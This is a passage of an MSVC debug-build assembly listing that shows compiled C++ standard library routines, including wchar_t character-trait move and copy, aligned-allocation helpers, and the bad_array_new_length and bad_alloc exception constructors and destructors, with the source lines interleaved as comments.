?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 121  :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 68   :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
__formal$ = 240
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00037	5f		 pop	 rdi
  00038	5d		 pop	 rbp
  00039	c3		 ret	 0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z PROC ; std::_Container_base0::_Swap_proxy_and_iterators, COMDAT

; 1177 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(_Container_base0&) noexcept {}

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ENDP ; std::_Container_base0::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Ptr_user$ = 8
_Ptr_container$ = 40
_Min_back_shift$ = 72
_Back_shift$ = 104
_Ptr$ = 352
_Bytes$ = 360
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN11:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00024	48 8b 85 68 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 83 c0 27	 add	 rax, 39			; 00000027H
  00032	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00039	48 89 01	 mov	 QWORD PTR [rcx], rax

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

  0003c	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  00043	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00046	48 89 45 08	 mov	 QWORD PTR _Ptr_user$[rbp], rax

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0004a	b8 08 00 00 00	 mov	 eax, 8
  0004f	48 6b c0 ff	 imul	 rax, rax, -1
  00053	48 8b 4d 08	 mov	 rcx, QWORD PTR _Ptr_user$[rbp]
  00057	48 8b 04 01	 mov	 rax, QWORD PTR [rcx+rax]
  0005b	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

  0005f	48 c7 45 48 08
	00 00 00	 mov	 QWORD PTR _Min_back_shift$[rbp], 8

; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00067	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  0006e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  00072	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00075	48 2b c1	 sub	 rax, rcx
  00078	48 89 45 68	 mov	 QWORD PTR _Back_shift$[rbp], rax
$LN4@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0007c	48 83 7d 68 08	 cmp	 QWORD PTR _Back_shift$[rbp], 8
  00081	72 09		 jb	 SHORT $LN8@Adjust_man
  00083	48 83 7d 68 27	 cmp	 QWORD PTR _Back_shift$[rbp], 39 ; 00000027H
  00088	77 02		 ja	 SHORT $LN8@Adjust_man
  0008a	eb 0b		 jmp	 SHORT $LN9@Adjust_man
$LN8@Adjust_man:
$LN7@Adjust_man:
  0008c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00091	33 c0		 xor	 eax, eax
  00093	85 c0		 test	 eax, eax
  00095	75 f5		 jne	 SHORT $LN7@Adjust_man
$LN9@Adjust_man:
  00097	33 c0		 xor	 eax, eax
  00099	85 c0		 test	 eax, eax
  0009b	75 df		 jne	 SHORT $LN4@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0009d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  000a4	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  000a8	48 89 08	 mov	 QWORD PTR [rax], rcx
$LN10@Adjust_man:

; 179  : }

  000ab	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  000b2	5f		 pop	 rdi
  000b3	5d		 pop	 rbp
  000b4	c3		 ret	 0
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   :         return ::operator new(_Bytes);

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00026	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 91   :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 200
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 64   :     _THROW(bad_array_new_length{});

  0001b	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00022	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  00027	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  0002e	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00035	e8 00 00 00 00	 call	 _CxxThrowException
$LN2@Throw_bad_:

; 65   : }

  0003a	48 8d a5 f8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+248]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QEAA@AEBV01@@Z
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 140  :         : bad_alloc("bad array new length")

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00026	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002d	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AEAA@QEBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00032	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00039	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00040	48 89 08	 mov	 QWORD PTR [rax], rcx

; 142  :     }

  00043	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
